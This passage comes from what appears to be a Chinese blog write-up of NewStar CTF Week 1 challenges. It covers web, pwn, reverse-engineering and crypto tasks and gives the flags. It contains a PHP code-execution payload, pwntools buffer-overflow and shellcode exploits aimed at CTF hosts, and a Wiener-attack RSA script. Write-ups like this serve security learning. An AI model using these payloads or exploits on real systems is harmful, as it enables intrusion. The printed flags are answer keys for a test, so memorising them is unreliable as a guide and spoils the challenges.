<a href="http://t.csdn.cn/7Y4Cc">这个博客</a> ，添加<code>X-Real-IP</code>为<code>127.0.0.1</code>。</p><p><img src="/NewStar-CTF-Week1/w_4_2.png"></p></li></ol><h2 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h2><ol><li><p><code>Level 1</code>、<code>Level 2</code>、<code>Level 3</code>都拿数组绕。</p></li><li><p><code>Level 4</code>，get传入<code>&#39;key5=2024a</code>，绕过<code>is_numeric</code>。</p></li><li><p><code>Level 5</code>，post传入<code>flag=%00</code>，即可得到flag。</p><p><img src="/NewStar-CTF-Week1/w_5_1.png"></p></li></ol><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h2><ol><li><p>通过百度搜或者爆破，可以知道<code>password=114514</code>。</p><p><img src="/NewStar-CTF-Week1/w_6_1.png"></p></li><li><p>php变量的特性，传入<code>e[v.a.l=phpinfo();</code>，成功执行代码。</p><p><img src="/NewStar-CTF-Week1/w_6_2.png"></p></li><li><p>利用反引号，成功读出flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=114514&amp;e[v.a.l=echo `tac /f*`;</span><br></pre></td></tr></table></figure><p><img src="/NewStar-CTF-Week1/w_6_3.png"></p></li></ol><h2 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h2><ol><li><p>爆破出<code>admin</code>的密码。</p><p><img src="/NewStar-CTF-Week1/w_7_1.png"></p></li><li><p>登录成功后，发现会跳转到另一个页面。</p><p><img src="/NewStar-CTF-Week1/w_7_2.png"></p></li><li><p>手动跟过去，即可得到flag。</p><p><img src="/NewStar-CTF-Week1/w_7_3.png"></p></li></ol><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="p1eee"><a href="#p1eee" class="headerlink" title="p1eee"></a>p1eee</h2><ol><li><p>开启了pie保护。</p></li><li><p>ida查看，能看到有后门函数。</p><p><img src="/NewStar-CTF-Week1/p_1_1.png"></p></li><li><p>查看变量<code>buf</code>，可以知道<code>buf</code>的长度为<code>0x20</code>。</p><p><img src="/NewStar-CTF-Week1/p_1_2.png"></p></li><li><p>exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./p1eee&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27761</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span> + <span class="string">&#x27;\x7b&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;A nice try to break pie!!!\n&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;A nice try to break pie!!!\n&#x27;</span>)</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span> + <span class="string">&#x27;\x64&#x27;</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>疑惑：为啥直接跳到后门不行，要先跳到<code>main</code>再跳到后门。</p></li></ol><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>ida打开，能直接看到后门的地址和字符长度。</p><p><img src="/NewStar-CTF-Week1/p_2_1.png"></p><p><img src="/NewStar-CTF-Week1/p_2_2.png"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line"><span class="comment">#sh = remote(&#x27;node4.buuoj.cn&#x27;, 26560)</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span> * <span class="number">32</span> + <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0x04011FB</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>学习链接：<a href="https://www.bilibili.com/read/cv11147377/?from=search&spm_id_from=333.337.0.0">https://www.bilibili.com/read/cv11147377/?from=search&amp;spm_id_from=333.337.0.0</a></p><p>基本和上面哪个一样。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#cal =  process(&#x27;./ezshellcode&#x27;)</span></span><br><span class="line">cal = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29446</span>)</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">cal.send(payload)</span><br><span class="line">cal.interactive()</span><br></pre></td></tr></table></figure><h2 id="newstar-shop"><a href="#newstar-shop" class="headerlink" title="newstar shop"></a>newstar shop</h2><p>整形溢出。</p><p>分析发现，<code>money</code>是一个无符号型整数，我们只要在商店花完钱，之后选3扣个50块，我们就能让<code>money</code>变成一个超大数，之后就能买<code>shell</code>了。</p><p><img src="/NewStar-CTF-Week1/p_4_1.png"></p><p><img src="/NewStar-CTF-Week1/p_4_2.png"></p><p><img src="/NewStar-CTF-Week1/p_4_3.png"></p><h2 id="Random"><a href="#Random" class="headerlink" title="Random"></a>Random</h2><p>伪随机数，只要种子确定好，就能<code>getshell</code>。</p><p>利用<code>$0</code>来获取shell，参考链接：<a href="http://lihuaxi.xjx100.cn/news/1189683.html?action=onClick">http://lihuaxi.xjx100.cn/news/1189683.html?action=onClick</a></p><p>因此我们获取的种子需要满足能返回<code>$0</code>，因此写了个判断，判断对了才进远端。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf=cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">aa=<span class="string">&quot;2$031&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    elf.srand(<span class="built_in">int</span>(time.time()))</span><br><span class="line">    payload = <span class="built_in">str</span>(elf.rand()).encode()</span><br><span class="line">    a=elf.rand()%<span class="number">5</span></span><br><span class="line">    b=elf.rand()%<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">2</span> <span class="keyword">and</span> b==<span class="number">1</span>:</span><br><span class="line">        <span class="comment">#cal = process(&#x27;./random&#x27;)</span></span><br><span class="line">        cal = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25768</span>)</span><br><span class="line">        cal.recvuntil(<span class="string">b&#x27;can you guess the number?&#x27;</span>)</span><br><span class="line">        cal.sendline(payload)</span><br><span class="line">        <span class="built_in">print</span>(aa[b]+aa[a])</span><br><span class="line">        cal.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="easy-RE"><a href="#easy-RE" class="headerlink" title="easy_RE"></a>easy_RE</h2><p>ida打开，就能在main函数找到两段flag。</p><p><img src="/NewStar-CTF-Week1/r_1_1.png"></p><p><img src="/NewStar-CTF-Week1/r_1_2.png"></p><h2 id="咳"><a href="#咳" class="headerlink" title="咳"></a>咳</h2><p>upx的壳。</p><ol><li><p>先用<code>exeinfope</code>查壳，可以知道是<code>upx</code>的壳。</p><p><img src="/NewStar-CTF-Week1/r_2_1.png"></p></li><li><p>脱壳后用ida打开，可以知道<code>flag</code>的每一个字符的<code>ascll</code>码都+1了之后再和<code>enc</code>做比较，还得知了<code>enc</code>的值。</p><p><img src="/NewStar-CTF-Week1/r_2_2.png"></p><p><img src="/NewStar-CTF-Week1/r_2_3.png"></p></li><li><p>最后的脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&quot;gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;C0ngratu1at10ns0nPa221ngTheF1rstPZGALAXY1eve1&#125;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h2><ol><li><p>ida打开，可以看到有一个<code>encode</code>函数，跟进查看，可以看到这个函数的逻辑。</p><p><img src="/NewStar-CTF-Week1/r_3_1.png"></p></li><li><p>后边把加密的字符先base64编码后，再和<code>VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t</code>做比较。</p></li><li><p>脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a=<span class="string">b&#x27;VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t&#x27;</span></span><br><span class="line">b=base64.b64decode(a)</span><br><span class="line">flag=<span class="string">&quot;&quot;</span>  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    flag+=<span class="built_in">chr</span>((i-<span class="number">16</span>)^<span class="number">0x20</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;D0_4ou_7now_wha7_ELF_1s?&#125;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="Segments"><a href="#Segments" class="headerlink" title="Segments"></a>Segments</h2><p>shift_f7，即可看到flag。</p><p><img src="/NewStar-CTF-Week1/r_4_1.png"></p><h2 id="Endian"><a href="#Endian" class="headerlink" title="Endian"></a>Endian</h2><p>ida打开，发现<code>array</code>数组的值和<code>0x12345678</code>做异或。</p><p><img src="/NewStar-CTF-Week1/r_5_1.png"></p><p><img src="/NewStar-CTF-Week1/r_5_2.png"></p><p>脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">a=[<span class="number">0x75553A1E</span>, <span class="number">0x7B583A03</span>, <span class="number">0x4D58220C</span>, <span class="number">0x7B50383D</span>, <span class="number">0x736B3819</span>]</span><br><span class="line">flag=<span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    hex_string=<span class="built_in">str</span>(<span class="built_in">hex</span>(i^<span class="number">0x12345678</span>))[<span class="number">2</span>:].encode()</span><br><span class="line">    <span class="comment">#print(hex_string)</span></span><br><span class="line">    flag+=binascii.unhexlify(hex_string)[::-<span class="number">1</span>] </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;llittl_Endian_a&#x27;</span></span><br></pre></td></tr></table></figure><p>最后加上一个大括号就行了。</p><h2 id="AndroXor"><a href="#AndroXor" class="headerlink" title="AndroXor"></a>AndroXor</h2><ol><li><p>用<code>jadx</code>逆向<code>apk</code>，之后在<code>MainActivity</code>找到了这个。</p><p><img src="/NewStar-CTF-Week1/r_6_1.png"></p></li><li><p>接着在下边找到了一个异或的密钥。</p></li><li><p>脚本（C++）：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> a[]=&#123;<span class="number">14</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">2</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="number">30</span>, <span class="number">20</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;\f&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="number">11</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="number">25</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>&#125;;</span><br><span class="line">string key=<span class="string">&quot;happyx3&quot;</span>;</span><br><span class="line">string flag=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">25</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">flag+=(<span class="type">char</span>)(a[i]^key[i%key.<span class="built_in">length</span>()]);</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;3z_And0r1d_X0r_x1x1&#125;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="lazy-activtiy"><a href="#lazy-activtiy" class="headerlink" title="lazy_activtiy"></a>lazy_activtiy</h2><p>同样用<code>jadx</code>逆向，全局搜<code>flag&#123;</code>即可看到flag。</p><p><img src="/NewStar-CTF-Week1/r_7_1.png"></p><h2 id="EzPE"><a href="#EzPE" class="headerlink" title="EzPE"></a>EzPE</h2><p>参考：<a href="https://www.cnblogs.com/cyx-b/p/13485664.html">https://www.cnblogs.com/cyx-b/p/13485664.html</a></p><p>先学习PE程序的结构，然后修复PE头。</p><p><img src="/NewStar-CTF-Week1/r_8_1.png"></p><p>之后用ida打开，可以发现输入出了最后一位，每一位都和后一位进行异或。</p><p><img src="/NewStar-CTF-Week1/r_8_2.png"></p><p><img src="/NewStar-CTF-Week1/r_8_3.png"></p><p>脚本（c++）：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="type">int</span> a[]=&#123;<span class="number">0x0A</span>,<span class="number">0x0C</span>,<span class="number">4</span>,<span class="number">0x1F</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="number">0xC</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="number">0x11</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="number">0x1A</span>,<span class="number">3</span>,<span class="number">0xD</span>,<span class="number">1</span>,<span class="string">&#x27;6&#x27;</span>,<span class="number">0x1F</span>,<span class="number">0x12</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="number">4</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>&#125;;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">35</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">    &#123;</span><br><span class="line">a[i]^=a[i+<span class="number">1</span>]^i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">36</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; (<span class="type">char</span>)a[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;Y0u_kn0w_what_1s_PE_File_F0rmat&#125;</span></span><br></pre></td></tr></table></figure><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h2><p>根据题目可以知道是brainfuck编码，随便找个在线网站解码就行了。</p><p><img src="/NewStar-CTF-Week1/c_1_1.png"></p><h2 id="Caesar’s-Secert"><a href="#Caesar’s-Secert" class="headerlink" title="Caesar’s Secert"></a>Caesar’s Secert</h2><p>凯撒加密，根据flag头推断出key为5。</p><p><img src="/NewStar-CTF-Week1/c_2_1.png"></p><h2 id="Fence"><a href="#Fence" class="headerlink" title="Fence"></a>Fence</h2><p>栅栏密码，根据 { 的位置推断出key为2 。</p><p><img src="/NewStar-CTF-Week1/c_3_1.png"></p><h2 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenère"></a>Vigenère</h2><p>维吉尼亚加密，根据flag头推算出<code>kfck</code>，尝试<code>kfc</code>后发现正确。</p><p><img src="/NewStar-CTF-Week1/c_4_1.png"></p><h2 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h2><p>用yafu分解n，之后直接套脚本。</p><p>源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_prime</span>(<span class="params">n</span>):</span><br><span class="line">    res = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        res *= getPrime(n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n = gen_prime(<span class="number">32</span>)</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">    <span class="built_in">print</span>(n)</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment"># 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span></span><br><span class="line"><span class="comment"># 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line">P1 = <span class="number">2804303069</span></span><br><span class="line">P2 = <span class="number">2217990919</span></span><br><span class="line">P3 = <span class="number">2794985117</span></span><br><span class="line">P4 = <span class="number">3939901243</span></span><br><span class="line">P5 = <span class="number">2923072267</span></span><br><span class="line">P6 = <span class="number">2370292207</span></span><br><span class="line">P7 = <span class="number">2970591037</span></span><br><span class="line">P8 = <span class="number">2706073949</span></span><br><span class="line">P9 = <span class="number">2338725373</span></span><br><span class="line">P10 = <span class="number">2463878387</span></span><br><span class="line">P11 = <span class="number">3654864131</span></span><br><span class="line">P12 = <span class="number">4093178561</span></span><br><span class="line">P13 = <span class="number">3831680819</span></span><br><span class="line">P14 = <span class="number">4278428893</span></span><br><span class="line">P15 = <span class="number">3207148519</span></span><br><span class="line"></span><br><span class="line">n=<span class="number">17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi=(P1-<span class="number">1</span>)*(P2-<span class="number">1</span>)*(P3-<span class="number">1</span>)*(P4-<span class="number">1</span>)*(P5-<span class="number">1</span>)*(P6-<span class="number">1</span>)*(P7-<span class="number">1</span>)*(P8-<span class="number">1</span>)*(P9-<span class="number">1</span>)*(P10-<span class="number">1</span>)*(P11-<span class="number">1</span>)*(P12-<span class="number">1</span>)*(P13-<span class="number">1</span>)*(P14-<span class="number">1</span>)*(P15-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">c=<span class="number">14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;us4_s1ge_t0_cal_phI&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Small-d"><a href="#Small-d" class="headerlink" title="Small d"></a>Small d</h2><p>超大的e，低解密指数攻击。</p><p>源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">d = getPrime(<span class="number">32</span>)</span><br><span class="line">e = inverse(d, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">n = p*q</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span></span><br><span class="line"><span class="comment"># e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span></span><br><span class="line"><span class="comment"># n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>(python2的脚本)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># -*- coding: cp936 -*-</span><br><span class="line">import gmpy2</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 展开为连分数</span><br><span class="line">def continuedFra(x, y):</span><br><span class="line">    cF = []</span><br><span class="line">    while y:</span><br><span class="line">        cF += [x / y]</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    return cF</span><br><span class="line"></span><br><span class="line">def Simplify(ctnf):</span><br><span class="line">    numerator = 0</span><br><span class="line">    denominator = 1</span><br><span class="line">    for x in ctnf[::-1]:</span><br><span class="line">        numerator, denominator = denominator, x * denominator + numerator</span><br><span class="line">    return (numerator, denominator)</span><br><span class="line"></span><br><span class="line"># 连分数化简</span><br><span class="line">def calculateFrac(x, y):</span><br><span class="line">    cF = continuedFra(x, y)</span><br><span class="line">    cF = map(Simplify, (cF[0:i] for i in xrange(1, len(cF))))</span><br><span class="line">    return cF</span><br><span class="line"></span><br><span class="line"># 解韦达定理</span><br><span class="line">def solve_pq(a, b, c):</span><br><span class="line">    par = gmpy2.isqrt(b * b - 4 * a * c)</span><br><span class="line">    return (-b + par) / (2 * a), (-b - par) / (2 * a)</span><br><span class="line"></span><br><span class="line">def wienerAttack(e, n):</span><br><span class="line">    for (d, k) in calculateFrac(e, n):</span><br><span class="line">        if k == 0: continue</span><br><span class="line">        if (e * d - 1) % k != 0: continue</span><br><span class="line"></span><br><span class="line">        phi = (e * d - 1) / k</span><br><span class="line">        p, q = solve_pq(1, n - phi + 1, n)</span><br><span class="line">        if p * q == n:</span><br><span class="line">            return abs(int(p)), abs(int(q))</span><br><span class="line">    print &#x27;not find!&#x27;</span><br><span class="line"></span><br><span class="line">time.clock()</span><br><span class="line">c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span><br><span class="line">e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span><br><span class="line">n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span><br><span class="line">p, q = wienerAttack(e, n)</span><br><span class="line"></span><br><span class="line">print &#x27;[+]Found!&#x27;</span><br><span class="line">print &#x27;  [-]p =&#x27;,p</span><br><span class="line">print &#x27;  [-]q =&#x27;,q</span><br><span class="line">print &#x27;  [-]n =&#x27;,p*q</span><br><span class="line">d = gmpy2.invert(e,(p-1)*(q-1))</span><br><span class="line">print &#x27;  [-]d =&#x27;, d</span><br><span class="line">print &#x27;  [-]m is:&#x27; + &#x27;&#123;:x&#125;&#x27;.format(pow(c,d,n)).decode(&#x27;hex&#x27;)</span><br><span class="line">print &#x27;\n[!]Timer:&#x27;, round(time.clock(),2), &#x27;s&#x27;</span><br><span class="line">print &#x27;[!]All Done!&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="babyxor"><a href="#babyxor" class="headerlink" title="babyxor"></a>babyxor</h2><p>源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ciphertext = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> flag:</span><br><span class="line">    ciphertext.append(f ^ key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(ciphertext).<span class="built_in">hex</span>())</span><br><span class="line"><span class="comment"># e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2</span></span><br></pre></td></tr></table></figure><p>先拿<code>0xe9</code>和<code>f</code>异或，得到key为143，最后用 <a href="https://cyberchef.cn/">cyberchef</a> 解出来。</p><p><img src="/NewStar-CTF-Week1/c_5_1.png"></p><h2 id="babyencoding"><a href="#babyencoding" class="headerlink" title="babyencoding"></a>babyencoding</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">part 1 of flag: 